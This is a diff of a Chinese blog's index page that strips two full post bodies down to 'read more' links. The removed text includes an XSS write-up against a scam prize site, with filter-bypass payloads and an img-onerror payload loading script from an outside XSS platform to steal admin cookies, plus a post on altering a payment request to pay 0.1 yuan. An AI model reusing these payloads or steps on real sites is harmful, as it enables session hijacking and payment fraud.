@@ -308,35 +308,16 @@
 
       
         
-          
-            <h1 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h1><p> 前几天上课的时候，忽然收到一条短信</p>
+          <h1 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h1><p> 前几天上课的时候，忽然收到一条短信</p>
 <p><img src="http://i.imgur.com/y3VFOAV.png" alt=""></p>
 <p> 打开网址如下：</p>
 <p><img src="http://i.imgur.com/WlRIEj7.png" alt=""></p>
 <p> 既然我有如此“运气”，就让我看看葫芦里卖的什么药吧！</p>
-<h1 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h1><h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><p> 随手x了一句</p>
-<pre><code>&lt;script&gt;alert(1)&lt;/script&gt;
-</code></pre><p> 发现报错了，我以为是对“script整个标签”进行了过滤（后来发现仅仅是对script进行过滤），然后就进行继续尝试。</p>
-<pre><code>&lt;scr&lt;script&gt;ipt&gt;alert(1)&lt;/scr&lt;script&gt;ipt&gt;
-</code></pre><p> 发现还是报错，然后考虑是不是只过滤script这个字符串，然后考虑用img标签进行尝试。</p>
-<pre><code>&lt;img src=&quot;#&quot; onerror=&quot;alert(1)&quot;&gt;
-</code></pre><p> 然后出现了我等待已久的弹窗</p>
-<p><img src="http://i.imgur.com/0mP4BSq.png" alt=""></p>
-<h2 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h2><p> 然后中午回去准备添加盗取cookies的代码，结果发现怎么都过不去，有一个点一直想不通，就是不知道对方到底过滤了什么，然后js填进去一直报错，我就一直想不通怎么在onerror事件里面让js生效，后来请教了好多人，得到的结果一直是没办法，这个没什么可x的，得不到什么结果，然后就放在一旁了，结果今天在论天逛的时候，发现了Black-Hole他的一篇文章里面提到了<imgsrc=x onerror="appendChild(createElement('script')).src='js_url'">这种用法，我一下子眼前一亮，然后知道了怎么添加js。然后就是登陆平台添加了一下盗取cookies代码，然后结合上文对过滤猜测的失误，我在想是不是仅仅是对script这个字符串进行了过滤，然后把t换成了&amp;#116</imgsrc=x></p>
-<pre><code>&lt;img src=xonerror=appendChild(createElement (&apos;scrip&amp;#116&apos;)).src=&apos;http://xss.0exp.cn/VdYVBx?1448952953&apos;/&gt;
-</code></pre><p> 然后显示订单成功</p>
-<p><img src="http://i.imgur.com/MgJdLJ0.png" alt=""></p>
-<h2 id="得到cookies"><a href="#得到cookies" class="headerlink" title="得到cookies"></a>得到cookies</h2><p> 打进去以后不一会，就收到cookies了</p>
-<p><img src="http://i.imgur.com/bp1fPEJ.png" alt=""></p>
-<h2 id="登陆后台"><a href="#登陆后台" class="headerlink" title="登陆后台"></a>登陆后台</h2><p> 然后就拖入老兵，进行访问。</p>
-<p><img src="http://i.imgur.com/Ab0xqhD.png" alt=""></p>
-<h1 id="最后想说"><a href="#最后想说" class="headerlink" title="最后想说"></a>最后想说</h1><p> 本文只做个人技术总结，并无宣扬对厂商造成破坏之意，且本漏洞已提交至乌云并已公开：</p>
-<blockquote>
-<p><a href="http://www.wooyun.org/bugs/wooyun-2015-0157351" target="_blank" rel="external">http://www.wooyun.org/bugs/wooyun-2015-0157351</a></p>
-</blockquote>
-<p>如有不妥之处，请联系我，必将配合删除，至此告之。</p>
-
-          
+          <div class="post-more-link text-center">
+            <a class="btn" href="/2016/04/18/一次收到”中奖短信“后的XSS测试/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
         
       
     </div>
@@ -453,25 +434,12 @@
 
       
         
-          
-            <p>前几天在看xss的时候偶然找到了一个成人用品网站，结果怎么x都会被实体，这个时候问了问表哥@Black-Hole，然后表哥太忙没有时间回复。所以就想换一个猥琐的思路，手段也很老了，是逻辑上的问题。</p>
-<h1 id="目标"><a href="#目标" class="headerlink" title="目标"></a>目标</h1><p>我们先来看一下本次的目标</p>
-<p><img src="http://i.imgur.com/8efpSvz.png" alt=""></p>
-<h1 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h1><h2 id="改包"><a href="#改包" class="headerlink" title="改包"></a>改包</h2><blockquote>
-<p>首先我们先抓包，找到支付金额的地方，改一下包，把金额改成一毛。</p>
-</blockquote>
-<p><img src="http://i.imgur.com/26OBEtk.png" alt=""></p>
-<p>##支付##</p>
-<p>我们按照要求支付一毛钱</p>
-<p><img src="http://i.imgur.com/2srBAtu.png" alt=""></p>
-<h1 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h1><p><img src="http://i.imgur.com/G06cUdH.png" alt=""></p>
-<h1 id="最后想说"><a href="#最后想说" class="headerlink" title="最后想说"></a>最后想说</h1><p>本文只做个人技术总结，并无宣扬对厂商造成破坏之意，且本漏洞已提交至乌云并已公开：</p>
-<blockquote>
-<p><a href="http://www.wooyun.org/bugs/wooyun-2016-0173411" target="_blank" rel="external">http://www.wooyun.org/bugs/wooyun-2016-0173411</a></p>
-</blockquote>
-<p>如有不妥之处，请联系我，必将配合删除，至此告之。</p>
-
-          
+          <p>前几天在看xss的时候偶然找到了一个成人用品网站，结果怎么x都会被实体，这个时候问了问表哥@Black-Hole，然后表哥太忙没有时间回复。所以就想换一个猥琐的思路，手段也很老了，是逻辑上的问题。<br>
+          <div class="post-more-link text-center">
+            <a class="btn" href="/2016/04/18/一毛钱买娃娃/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
         
       
     </div>
